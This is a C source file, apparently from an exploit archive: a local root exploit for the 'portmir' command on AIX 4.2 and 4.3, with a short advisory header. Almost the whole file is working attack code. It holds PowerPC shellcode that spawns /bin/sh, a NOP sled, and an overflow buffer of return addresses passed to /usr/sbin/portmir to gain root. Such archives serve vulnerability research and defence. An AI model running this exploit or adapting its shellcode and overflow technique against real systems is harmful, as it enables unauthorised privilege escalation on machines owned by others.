/*
source: https://www.securityfocus.com/bid/385/info

AIX version 4.2.1 introduced a new command titled 'portmir'. This new program had two notable vulnerabilites. First it contained a buffer overflow which allowed malicious users to obtain root privileges. Secondly it wrote it's log files to a world readable directly thereby exposing security relavent information.
*/

/*## copyright LAST STAGE OF DELIRIUM oct 2000 poland        *://lsd-pl.net/ #*/
/*## /usr/bin/portmir                                                        #*/

/*   note: to avoid potential system hang-up please, first obtain the exact   */
/*   AIX OS level with the use of the uname -a or oslevel commands            */

#define ADRNUM 400
#define NOPNUM 16000
#define ALLIGN 2

char shellcode[]=
    "\x7c\xa5\x2a\x79"     /* xor.    r5,r5,r5               */
    "\x40\x82\xff\xfd"     /* bnel    <shellcode>            */
    "\x7f\xe8\x02\xa6"     /* mflr    r31                    */
    "\x3b\xff\x01\x20"     /* cal     r31,0x120(r31)         */
    "\x38\x7f\xff\x08"     /* cal     r3,-248(r31)           */
    "\x38\x9f\xff\x10"     /* cal     r4,-240(r31)           */
    "\x90\x7f\xff\x10"     /* st      r3,-240(r31)           */
    "\x90\xbf\xff\x14"     /* st      r5,-236(r31)           */
    "\x88\x5f\xff\x0f"     /* lbz     r2,-241(r31)           */
    "\x98\xbf\xff\x0f"     /* stb     r5,-241(r31)           */
    "\x4c\xc6\x33\x42"     /* crorc   cr6,cr6,cr6            */
    "\x44\xff\xff\x02"     /* svca                           */
    "/bin/sh\xff"
;

char nop[]="\x7f\xff\xfb\x78";

main(int argc,char **argv,char **e){
    char buffer[20000],adr[4],*b,*envp[2];
    int i;

    printf("copyright LAST STAGE OF DELIRIUM oct 2000 poland  //lsd-pl.net/\n");
    printf("/usr/sbin/portmir for aix 4.2 4.3 4.3.x PowerPC/POWER\n\n");

    if(argc<2){
        printf("usage: %s 42|43|433\n",argv[0]);exit(-1);
    }

    switch(atoi(argv[1])){
    case  42: shellcode[55]=0x02; break;
    case  43: shellcode[55]=0x04; break;
    case 433: shellcode[55]=0x03; break;
    default: exit(-1);
    }

    i=0; while(*e++) i+=strlen(*e)+1;
    *((unsigned long*)adr)=(unsigned long)e+(i&~3)-8000;

    envp[0]=&buffer[1000];
    envp[1]=0;

    b=buffer;
    for(i=0;i<ALLIGN;i++) *b++=adr[i%4];
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    b=&buffer[1000];
    sprintf(b,"xxx=");b+=4;
    for(i=0;i<ALLIGN;i++) *b++=' ';
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;

    execle("/usr/sbin/portmir","lsd","-t",buffer,0,envp);
}